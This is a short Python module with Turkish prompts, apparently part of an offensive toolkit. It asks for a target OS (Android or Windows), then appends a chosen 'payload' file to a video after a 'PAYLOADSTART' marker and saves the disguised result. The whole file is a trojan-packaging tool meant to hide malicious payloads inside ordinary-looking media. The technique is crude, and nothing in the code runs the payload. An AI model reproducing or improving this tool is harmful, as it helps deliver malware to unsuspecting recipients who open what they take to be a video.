import os
from modules.logger import log_event

def embed_payload(video_path, payload_path, output_path):
    with open(video_path, 'rb') as vf, open(payload_path, 'rb') as pf:
        video_data = vf.read()
        payload_data = pf.read()
    with open(output_path, 'wb') as out:
        out.write(video_data)
        out.write(b'PAYLOADSTART')
        out.write(payload_data)

def create_video_payload():
    print("Payloadlı video oluşturma modülü")
    os_type = input("Hedef işletim sistemi (android/windows): ").lower()
    video_path = input("Payload gömülecek video dosyasının tam yolu: ").strip()
    payload_path = input("Gömülecek payload dosyasının tam yolu: ").strip()
    output_path = input("Oluşturulacak dosya adı (ör: output.mp4): ").strip()

    if not os.path.isfile(video_path):
        print("Video dosyası bulunamadı.")
        return
    if not os.path.isfile(payload_path):
        print("Payload dosyası bulunamadı.")
        return

    if os_type == 'android':
        save_path = "/sdcard/" + output_path
    elif os_type == 'windows':
        save_path = os.path.join(os.path.dirname(video_path), output_path)
    else:
        print("Geçersiz işletim sistemi girdiniz.")
        return

    embed_payload(video_path, payload_path, save_path)
    log_event(f"Payloadlı video oluşturuldu ve kaydedildi: {save_path}")
    print(f"Başarıyla oluşturuldu: {save_path}")
